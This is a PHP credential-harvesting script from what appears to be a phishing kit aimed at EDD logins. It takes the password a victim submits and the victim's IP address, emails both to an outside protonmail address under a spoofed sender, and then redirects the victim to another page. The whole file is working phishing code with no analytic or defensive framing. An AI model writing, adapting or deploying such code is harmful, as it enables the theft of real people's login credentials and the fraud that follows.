<?php

$subject = " EDD LOGIN PASS ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['userpass']."\n";
$message = "Passsword: ".$_POST["userpass"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: Logins@waya.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("dswaglogs@protonmail.com",$subject,$message, $headers);



header("location: email.html"); 



?>